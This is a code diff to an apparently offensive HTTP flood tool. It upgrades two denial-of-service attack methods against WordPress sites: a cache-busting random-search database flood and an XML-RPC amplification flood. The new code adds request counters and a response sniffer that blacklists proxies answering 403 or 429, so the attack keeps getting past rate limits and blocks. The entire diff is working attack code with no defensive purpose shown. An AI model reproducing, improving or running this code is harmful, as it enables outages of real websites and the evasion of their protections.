@@ -1786,17 +1786,14 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def WP_SEARCH(self):
-        # [OPTIMIZED] WordPress Database Stresser
-        # Sends requests to /?s=RANDOM ensuring no cache hit and high DB usage.
-        
-        # Prepare Base Request
-        # Append ?s= or &s= depending on existing query
+        # [UPGRADED] WP DB Stresser with Blacklist & Monitor
         sep = "&" if "?" in self._target.raw_path_qs else "?"
-        
-        s = None
         s = None
         try:
             s = self.open_connection()
+            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
+            CONNECTIONS_SENT += 1
+            
             for _ in range(self._rpc):
                 search_query = ProxyTools.Random.rand_str(randint(5, 15))
                 full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
@@ -1806,30 +1803,28 @@ class HttpFlood(Thread):
                 payload = (f"GET {full_path} HTTP/1.1\r\n"
                            f"Host: {self._target.authority}\r\n"
                            f"User-Agent: {ua}\r\n"
-                           f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                            f"{headers}"
                            f"Connection: keep-alive\r\n"
-                           f"Upgrade-Insecure-Requests: 1\r\n"
-                           f"Cache-Control: no-cache\r\n"
-                           f"Pragma: no-cache\r\n"
                            f"\r\n").encode("utf-8")
                 
                 if Tools.send(s, payload):
-                     # print(f"[{int(REQUESTS_SENT)}] [DEBUG] WP_SEARCH: Packet Sent to {self._target.authority}")
-                     pass
-        except Exception as e:
-            err = str(e)
-            if "timed out" in err or "Timeout" in err:
-                 print(f"[DEBUG] WP_SEARCH: Connection Timeout (Target Lagging/Down)")
-                 pass
-            elif "[Errno 111]" in err or "Connection refused" in err:
-                pass
-            elif "[Errno 104]" in err or "Reset by peer" in err:
-                pass
-            elif "Broken pipe" in err:
-                pass
-            else:
-                pass
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
+                    
+                    # Status Sniffer for Blacklist
+                    try:
+                        response_start = s.recv(20).decode('utf-8', errors='ignore')
+                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                            status_code = response_start.split(" ")[1]
+                            if status_code in {"403", "429"}:
+                                if hasattr(self, '_current_proxy'):
+                                    BURNED_PROXIES.add(self._current_proxy)
+                                raise Exception("Proxy Blocked")
+                    except Exception as e:
+                        if "Blocked" in str(e): raise e
+                        pass
+        except:
+            pass
         Tools.safe_close(s)
 
     def XMLRPC_AMP(self):
@@ -1875,16 +1870,20 @@ class HttpFlood(Thread):
             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Amplification Packet Sent to {self._target.authority}")
             
             for _ in range(self._rpc):
-                Tools.send(s, post_payload)
-        except Exception as e:
-            err = str(e)
-            if "timed out" in err or "Timeout" in err:
-                 # print(f"[DEBUG] XMLRPC: Connection Timeout (Target Lagging/Down)")
-                 pass
-            elif "refused" in err or "Reset" in err:
-                pass
-            else:
-                pass
+                if Tools.send(s, post_payload):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(post_payload)
+                    # Simple sniffer
+                    try:
+                        response_start = s.recv(20).decode('utf-8', errors='ignore')
+                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                            if response_start.split(" ")[1] in {"403", "429"}:
+                                if hasattr(self, '_current_proxy'):
+                                    BURNED_PROXIES.add(self._current_proxy)
+                                break
+                    except: pass
+        except:
+            pass
         Tools.safe_close(s)
 
 
